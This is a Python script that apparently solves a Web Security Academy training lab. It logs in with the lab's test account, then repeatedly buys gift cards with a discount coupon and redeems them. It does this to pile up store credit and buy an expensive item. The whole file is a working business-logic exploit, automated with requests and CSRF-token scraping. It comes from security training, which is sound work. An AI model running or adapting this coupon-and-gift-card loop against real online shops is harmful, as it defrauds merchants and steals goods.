from lxml import html
import requests
from rich.console import Console

Console()

SERVER = "https://0a9b0092044865b18092b2df00b900df.web-security-academy.net"
COUPON = "SIGNUP30"

session = requests.session()
console = Console()

def get_csrf_token(endpoint):
    page = session.get(f"{SERVER}/{endpoint}")
    csrf_token = html.fromstring(page.content).xpath('//input[@name="csrf"]/@value')[0]
    return csrf_token


def do_login(username, password):
    csrf_token = get_csrf_token("login")
    print(f"CSRF: {csrf_token}") 
    response = session.post(f"{SERVER}/login", data={"csrf":csrf_token, "username":username, "password":password})
    return response.status_code


def get_store_credit():
    response = session.get(SERVER)
    strong = html.fromstring(response.content).xpath('//strong')[0].text
    store_credit = strong.split("$")[-1]
    return float(store_credit)
    

def add_gift_cards_to_cart():
    session.post(f"{SERVER}/cart", data={"productId":2, "redir":"PRODUCT", "quantity":20})
    

def add_coupon():
    csrf_token = get_csrf_token("/cart")
    session.post(f"{SERVER}/cart/coupon", data={"csrf":csrf_token,"coupon":"SIGNUP30"})


def checkout():
    csrf_token = get_csrf_token("/cart")
    return session.post(f"{SERVER}/cart/checkout", data={"csrf":csrf_token})


def get_gift_cards_list(response):
    return [elem.text for elem in html.fromstring(response.content).xpath('//table[@class="is-table-numbers"]//td')][:20]


def redeem_gift_cards(gift_cards):   
    csrf_token = get_csrf_token("my-account")
    for gift_card in gift_cards:
        console.log(f"Gift card: {gift_card}")
        console.log(session.post(f"{SERVER}/gift-card", data={"csrf":csrf_token, "gift-card":gift_card}).status_code)


def add_leet_jacket():
    session.post(f"{SERVER}/cart", data={"productId":1, "redir":"PRODUCT", "quantity":1})

with console.status("Logging in"):
    response = do_login("wiener","peter")

store_credit = get_store_credit()
while store_credit < 1337.0*0.7:
    with console.status("Buying gift cards"):
        add_gift_cards_to_cart()
        add_coupon()
        response = checkout()
        gift_cards = get_gift_cards_list(response)
    
    with console.status("Reedeeming gift cards"):
        redeem_gift_cards(gift_cards)

    with console.status("Fetching store credit"):
        store_credit = get_store_credit()
        console.log(f"Store credit: {store_credit}")


# Buy l33t jacket
with console.status("Buying leet jacket"):
    add_leet_jacket()
    add_coupon()
    checkout()